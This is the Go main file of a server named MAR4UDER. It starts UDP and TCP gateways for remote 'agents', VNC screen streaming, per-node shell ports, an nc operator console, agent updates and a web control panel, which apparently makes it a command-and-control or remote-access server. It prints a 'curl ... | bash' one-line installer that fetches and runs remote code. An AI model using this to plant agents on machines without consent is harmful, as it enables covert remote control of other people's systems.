package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
)

func main() {
	configPath := flag.String("config", "config.json", "Path to config file")
	httpFlag := flag.String("http", "", "HTTP listen address (e.g. 0.0.0.0:8080)")
	udpFlag := flag.String("udp", "", "UDP listen address for agents (e.g. 0.0.0.0:443)")
	tcpFlag := flag.String("tcp", "", "TCP listen address for VNC streaming (e.g. 0.0.0.0:5900)")
	tokenFlag := flag.String("token", "", "Authentication token for API and WebSockets")
	operatorFlag := flag.String("operator", "", "TCP Operator Console listen address (e.g. 0.0.0.0:9000)")
	rfbFlag := flag.String("rfb", "", "Standard VNC RFB server listen address (e.g. 0.0.0.0:5900)")
	genConfig := flag.Bool("gen-config", false, "Generate default config.json and exit")
	flag.Parse()

	if *genConfig {
		cfg := DefaultConfig()
		if err := SaveConfig(*configPath, cfg); err != nil {
			log.Fatalf("[-] Failed to save config: %v", err)
		}
		fmt.Printf("[+] Generated default configuration at: %s\n", *configPath)
		return
	}

	cfg, err := LoadConfig(*configPath)
	if err != nil {
		log.Fatalf("[-] Failed to load config from %s: %v", *configPath, err)
	}

	// CLI flags override config file
	if *httpFlag != "" {
		cfg.HTTPAddr = *httpFlag
	}
	if *udpFlag != "" {
		cfg.UDPAddr = *udpFlag
	}
	if *tcpFlag != "" {
		cfg.TCPAddr = *tcpFlag
	}
	if *operatorFlag != "" {
		cfg.OperatorAddr = *operatorFlag
	}
	if *rfbFlag != "" {
		cfg.RFBAddr = *rfbFlag
	}
	if *tokenFlag != "" {
		cfg.AuthToken = *tokenFlag
	}

	stats := &ServerStats{
		StartTime: time.Now(),
	}

	nm := NewNodeManager("nodes_config.json")
	fileMgr, err := NewFileManager("mar4uder_files")
	if err != nil {
		log.Fatalf("[-] Failed to initialize file manager: %v", err)
	}

	// 1. Start UDP Gateway (Agent Heartbeat & PTY Tunnel)
	udpGw, err := NewUDPGateway(cfg.UDPAddr, nm, stats)
	if err != nil {
		log.Fatalf("[-] Failed to bind UDP gateway on %s: %v", cfg.UDPAddr, err)
	}
	go udpGw.Start()

	// 2. Start TCP Gateway (Reliable VNC Dirty-Tile Stream)
	tcpGw, err := NewTCPGateway(cfg.TCPAddr, nm, stats)
	if err != nil {
		log.Fatalf("[-] Failed to bind TCP stream gateway on %s: %v", cfg.TCPAddr, err)
	}
	go tcpGw.Start()

	// 3. Start Standard RFC 6143 VNC Server Gateway (port 5900)
	rfbAddr := cfg.RFBAddr
	if rfbAddr == "" {
		rfbAddr = "0.0.0.0:5900"
	}
	rfbGw, err := NewRFBGateway(rfbAddr, nm, udpGw, cfg, stats)
	if err != nil {
		log.Printf("[-] Failed to bind RFB (VNC) server on %s: %v", rfbAddr, err)
	} else {
		go rfbGw.Start()
	}

	// 4. Start Remote Agent Update Manager
	updateMgr := NewUpdateManager(nm, udpGw, cfg)

	// 5. Start Dedicated Sequential Port Pool (PTY: 9000+N, VNC: 5900+N)
	portPool := NewPortPoolManager(nm, udpGw, rfbGw, cfg)
	go portPool.Start()

	// 6. Start TCP Operator Console (nc host 9000)
	toc, err := NewTCPOperatorConsole(cfg.OperatorAddr, nm, udpGw, fileMgr, updateMgr, cfg, stats)
	if err != nil {
		log.Printf("[-] Failed to bind TCP operator console on %s: %v", cfg.OperatorAddr, err)
	} else {
		go toc.Start()
	}

	// 7. Start Control API & Web UI Server
	api := NewAPIServer(cfg, nm, udpGw, fileMgr, updateMgr, stats)
	mux := http.NewServeMux()
	api.RegisterRoutes(mux)

	httpServer := &http.Server{
		Addr:    cfg.HTTPAddr,
		Handler: mux,
	}

	go func() {
		if err := httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("[-] HTTP Server error: %v", err)
		}
	}()

	fmt.Println("==============================================================")
	fmt.Println("   MAR4UDER // HIGH-PERFORMANCE CONTROL PLANE & RELAY CORE    ")
	fmt.Println("==============================================================")
	fmt.Printf("[+] UDP Agent Gateway:   udp://%s\n", cfg.UDPAddr)
	fmt.Printf("[+] TCP VNC Stream:      tcp://%s\n", cfg.TCPAddr)
	fmt.Printf("[+] TCP Operator (nc):   tcp://%s\n", cfg.OperatorAddr)
	fmt.Printf("[+] Standard VNC (RFB):  vnc://%s (TigerVNC / Remmina / UltraVNC)\n", rfbAddr)
	fmt.Println("[+] Dedicated Ports:     PTY 9001..9099 | VNC 5901..5999 per node")
	fmt.Printf("[+] Control Plane & UI:  http://%s\n", cfg.HTTPAddr)
	fmt.Printf("[+] 1-Line Installer:    curl -s http://<SERVER_IP>%s/i | bash\n", getPortSuffix(cfg.HTTPAddr))
	fmt.Printf("[+] Authentication:      Bearer %s\n", cfg.AuthToken)
	fmt.Println("==============================================================")
	fmt.Printf("[*] Open browser: http://localhost%s (or public IP)\n", getPortSuffix(cfg.HTTPAddr))
	fmt.Println("[*] Press Ctrl+C to stop.")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	<-sigChan

	fmt.Println("\n[*] Shutting down MAR4UDER server gracefully...")
	portPool.Stop()
	_ = httpServer.Close()
	fmt.Println("[+] Server stopped.")
}

func getPortSuffix(addr string) string {
	for i := len(addr) - 1; i >= 0; i-- {
		if addr[i] == ':' {
			return addr[i:]
		}
	}
	return ""
}
